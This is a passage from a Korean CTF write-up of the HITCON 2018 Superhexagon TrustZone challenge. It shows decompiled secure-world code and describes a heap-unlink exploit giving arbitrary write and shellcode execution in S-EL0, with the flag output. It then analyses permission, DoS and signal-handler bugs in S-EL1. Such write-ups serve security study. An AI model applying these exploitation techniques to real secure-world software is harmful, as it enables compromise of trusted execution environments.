<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_00001000</span>(undefined4 param_1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  auStack_1c[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> (undefined2)<span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000._32_4_;
</span></span><span style="display:flex;"><span>  pTStack_18 <span style="color:#f92672">=</span> tci_handle;
</span></span><span style="display:flex;"><span>  tci_handle<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  uStack_44 <span style="color:#f92672">=</span> param_1;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcpy</span>(pTVar1<span style="color:#f92672">-&gt;</span>data,<span style="color:#f92672">&amp;</span>uStack_3c);
</span></span><span style="display:flex;"><span>  uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x104f</span>;
</span></span><span style="display:flex;"><span>  puVar2 <span style="color:#f92672">=</span> (undefined4 <span style="color:#f92672">*</span>)<span style="color:#a6e22e">FUN_0000166c</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  pcStack_54 <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_Secure_DB_access_failed_</span>(SIGSEGV_00002000 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>  ...
</span></span></code></pre></div><p>다시 원래 context로 복원하여 계속 실행되게 된다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/428e3bfa84595f217f4a7f64abce7d06.png" alt=""  />
<br>
secure world에서의 pagewalk 결과를 보면, 매핑 자체가 PL0에서 RWX 임을 알 수 있다.<br>
다음과 같은 malloc 내부 로직을 이용하여 4 bytes aaw를 달성한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>      ...
</span></span><span style="display:flex;"><span>      FD <span style="color:#f92672">=</span> iter_chunk<span style="color:#f92672">-&gt;</span>fd;
</span></span><span style="display:flex;"><span>      BK <span style="color:#f92672">=</span> (freed_chunk <span style="color:#f92672">*</span>)iter_chunk<span style="color:#f92672">-&gt;</span>bk;
</span></span><span style="display:flex;"><span>      cur_sz <span style="color:#f92672">=</span> iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffc</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;=</span> cur_sz) {
</span></span><span style="display:flex;"><span>        BK<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> FD;
</span></span><span style="display:flex;"><span>        FD<span style="color:#f92672">-&gt;</span>bk <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint32_t</span>)BK;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> cur_sz) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> cur_sz) <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* prev inuse bit set */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>iter_chunk<span style="color:#f92672">-&gt;</span>bk;
</span></span><span style="display:flex;"><span>      ...
</span></span></code></pre></div><p>Arena.chunk_ptr을 변조하면 S-EL0의 code segment에 대한 청크 할당이 가능해진다.<br>
이를 이용해 S-EL0의 엔트리를 변조해서 임의 쉘코드 실행을 달성한다.</p>
<p>내부적으로 이미 할당된 청크에 대해서는 free이후 다시 할당해서 reclaim이 가능하다.<br>
freelist에 역순으로 size 더 크게해서 chunk free하고 취약점을 트리거해서 메타데이터를 덮었다.<br>
이후 Arena 구조체의 entry를 4 bytes aaw primitive를 이용해 덮고, freelist에 적합한 size를 초과한 크기를 할당하면 원하는 S-EL0의 .text 영역에 read/write가 가능해진다.</p>
<p>exploit 전략은 다음과 같다.</p>
<ol>
<li>chunk 2 1 0 free.</li>
<li>chunk 0 reclaim → heap overflow.</li>
<li>chunk 1 할당, 0x100050 fd,bk 작성해서 freelist 순회 끊키 → unlink aaw Arena.chunk_ptr overwrite → .text.</li>
<li>size를 0x300 정도로 설정해서 next chunk에 write 연산 sigsegv 방지, 돌고 있는 memcpy 코드 수정 방지 &amp; 할당된 청크에 쉘 코드 작성.</li>
<li>시스템 레지스터를 읽고 world shared memory에 flag write하고 software interrupt 0를 발생시켜 normal world로 복귀해서 플래그 출력.<br>
취약점 자체는 간단해서 금방 찾았는데 malloc 내부 로직에서 자꾸 꼬여서 익스가 힘들었다.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">Paused</span> (press any to <span style="color:#66d9ef">continue</span>)
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Switching to interactive mode
</span></span><span style="display:flex;"><span>hitcon{this is flag <span style="color:#ae81ff">3</span> <span style="color:#66d9ef">for</span> EL2}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span>x00hitcon{this is flag <span style="color:#ae81ff">4</span> <span style="color:#66d9ef">for</span> S<span style="color:#f92672">-</span>EL0}[<span style="color:#f92672">*</span>] Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span></code></pre></div><h2 id="s-el1-secure-kernel">S-EL1, Secure kernel<a hidden class="anchor" aria-hidden="true" href="#s-el1-secure-kernel">#</a></h2>
<p>이제 S-EL1에서 Secure world의 물리 메모리까지 마음대로 수정할 수 있으면 S-EL3를 공격할 수 있다.<br>
실질적으로 Secure world는 EL0&amp;1 regime가 singe VA range 방식을 취하고 있기에 좀 더 구조적으로 취약하다.<br>
S-EL1 자체는 S-EL0 뿐만 아니라 EL2에서도 간접적으로 상호 작용이 가능해 공격 벡터가 될 수 있다.</p>
<h3 id="vulnerability-1---permission-bug">Vulnerability 1 - Permission bug<a hidden class="anchor" aria-hidden="true" href="#vulnerability-1---permission-bug">#</a></h3>
<p>Secure physical address에 대한 접근은 제한된다.<br>
그런데 약간의 문제가 발생할 여지가 있다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/58268e73ab9f35acad3edec6b89b7666.png" alt=""  />
<br>
권한 설정에 문제가 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> va <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x15</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7f</span>;
</span></span><span style="display:flex;"><span>    uVar3 <span style="color:#f92672">=</span> va <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1ff</span>;
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> uVar2 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl1 <span style="color:#f92672">+</span> iVar1) <span style="color:#f92672">|</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(iVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8004004</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      local_c <span style="color:#f92672">=</span> (uVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      iVar1 <span style="color:#f92672">=</span> (uVar3 <span style="color:#f92672">+</span> uVar2 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> iVar1) <span style="color:#f92672">|</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(iVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8005004</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>trans_table_lvl2에 0x200 * 8 을 더해서 접근하는 이유는 lvl2 page table이 연속적이기 때문이었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_080003da</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">int</span> phys,<span style="color:#66d9ef">int</span> sz,undefined4 prop)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> size;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> phys_addr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> VA;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  size <span style="color:#f92672">=</span> sz;
</span></span><span style="display:flex;"><span>  phys_addr <span style="color:#f92672">=</span> phys;
</span></span><span style="display:flex;"><span>  VA <span style="color:#f92672">=</span> param_1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>( true ) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080001e8</span>(VA,phys_addr,prop);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    VA <span style="color:#f92672">=</span> VA <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    phys_addr <span style="color:#f92672">=</span> phys_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> size <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>분석한 결과를 토대로 FUN_0800054a은 그냥 할당되지 않은 VA를 리턴하는 함수라는 것을 알 수 있다.<br>
FUN_080003da은 컨트롤 불가능한 Secure VA와 Non-secure PA와 size, 고정된 attribute 값을 인자로 받는다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> MemMapEntry memmap[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">/* Space up to 0x8000000 is reserved for a boot ROM */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_FLASH] <span style="color:#f92672">=</span>              {          <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x08000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_CPUPERIPHS] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x08000000</span>, <span style="color:#ae81ff">0x00020000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_UART] <span style="color:#f92672">=</span>               { <span style="color:#ae81ff">0x09000000</span>, <span style="color:#ae81ff">0x00001000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_SECURE_MEM] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x0e000000</span>, <span style="color:#ae81ff">0x01000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_MEM] <span style="color:#f92672">=</span>                { <span style="color:#ae81ff">0x40000000</span>, RAMLIMIT_BYTES },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>};
</span></span></code></pre></div><p>integer overflow 버그가 존재하지만 취약점으로 0x0 번지를 할당받아도 최대 사이즈 검증 때문에 절대 FLASH 영역을 벗어날 수 없어 의미가 없다.<br>
write를 하더라도 qemu 에뮬레이터는 실제 환경과 동일하게 FLASH의 read only를 보장한다.<br>
악용할 수 없는 취약점이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_080001e8</span>(uint addr,uint phys_addr,uint param_3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  uVar3 <span style="color:#f92672">=</span> addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x15</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7f</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl1 <span style="color:#f92672">+</span> uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8004004</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800019c</span>(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl1 <span style="color:#f92672">+</span> uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  iVar2 <span style="color:#f92672">=</span> ((addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1ff</span>) <span style="color:#f92672">+</span> uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> iVar2) <span style="color:#f92672">=</span> local_30 <span style="color:#f92672">|</span> phys_addr;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8005004</span>) <span style="color:#f92672">=</span> uStack_2c;
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>내부적으로 walk해서 다음과 같이 할당한다.<br>
이때 넘어가는 물리 주소는 비트맵을 통해 관리되며 할당 해제된 상태에선 1로 마스킹된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_080006ba</span>(<span style="color:#66d9ef">int</span> phys)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> phys <span style="color:#f92672">-</span> secure_phys_max <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">17</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (uVar1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>) {
</span></span><span style="display:flex;"><span>    v0[uVar1] <span style="color:#f92672">=</span> v0[uVar1] <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">-</span> (phys <span style="color:#f92672">-</span> secure_phys_max <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0</span>b00011111) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>2 진수로 보면 편한데, 내부적으로 Secure VA를 PA로 변환하고 0을 대입한다.<br>
그리고 size 만큼 루프돌면서 위 함수를 호출하는데, 이는 v0에 일종의 bitmap 방식으로 freed memory를 마킹한다.</p>
<h3 id="vulnerability-2---file-upload-dos">Vulnerability 2 - file upload DOS<a hidden class="anchor" aria-hidden="true" href="#vulnerability-2---file-upload-dos">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">verify</span>(param_1,param_2);
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>),<span style="color:#ae81ff">0</span>,iVar1);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_08001906</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>),param_1 <span style="color:#f92672">+</span> iVar4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span>,
</span></span><span style="display:flex;"><span>                     <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>),<span style="color:#ae81ff">0</span>,iVar2);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#ae81ff">0xff8000</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x8000</span>);
</span></span><span style="display:flex;"><span>      Entry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(dword <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>      tci_handle <span style="color:#f92672">=</span> (TCI <span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>	...
</span></span></code></pre></div><p>업로드 코드의 일부이다.<br>
다른 world이고 translation 방식도 다른데 secure world의 VA를 넘기는게 이상했다.<br>
유효하지 않은 주소를 보내면 DOS가 가능하다.</p>
<p>system call interface도 공격 벡터가 될 수 있으니 다음 software interrupt handler를 분석해야한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_08000a30</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span>(from_text) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_08000918</span>(ctx.r0);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_08000928</span>(ctx.r0,ctx.r1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_08000964</span>(ctx.r0,ctx.r1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080009d6</span>(ctx.r0,ctx.r1);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ctx.r0 <span style="color:#f92672">=</span> local_10;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span></code></pre></div><p>case 0은 normal world로 복귀할 때 이용한다.<br>
S-EL3에선 ctx.x0에 여기서 Secure application에서 넘긴 리턴 값을 Normal world로 옮긴다.<br>
case 1은 signal handler를 할당한다.</p>
<h3 id="vulnerability-3---signal-handler">Vulnerability 3 - signal handler<a hidden class="anchor" aria-hidden="true" href="#vulnerability-3---signal-handler">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_08000928</span>(<span style="color:#66d9ef">int</span> r0,uint r1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((r1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x2400000</span>) <span style="color:#f92672">&amp;&amp;</span> (r0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb</span>)) {
</span></span><span style="display:flex;"><span>    _signal_handler <span style="color:#f92672">=</span> r1;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이때 검증이 없어 world shared memory도 signal handler 등록이 가능하다.</p>
<p>FUN_08000964는 이용가능한 VA에 물리 주소를 매핑한다.<br>
case 2, 3은 메모리 매핑 및 언매핑 함수다.<br>
공통적으로 다음 로직이 구현된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">FUN_080005ac</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iter;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_c <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  iter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ((iter <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">&amp;&amp;</span> (local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080005a2</span>(v0[iter]), local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">32</span>))) {
</span></span><span style="display:flex;"><span>    iter <span style="color:#f92672">=</span> iter <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x20</span>) {
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    v0[iter] <span style="color:#f92672">=</span> v0[iter] <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#ae81ff">0x1fU</span> <span style="color:#f92672">-</span> local_c <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>));
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> local_c <span style="color:#f92672">+</span> iter <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> local_c;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Secure VA를 페이지 테이블에서 제거할 때 right shift 17을 했었다.<br>
그냥 비트맵을 확인하고 물리메모리가 비었으면 그 부분을 리턴한다.<br>
2^12랑 곱하면 특정 비트에 해당하는 주소를 계산할 수 있다는 것을 알 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">FUN_08000684</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
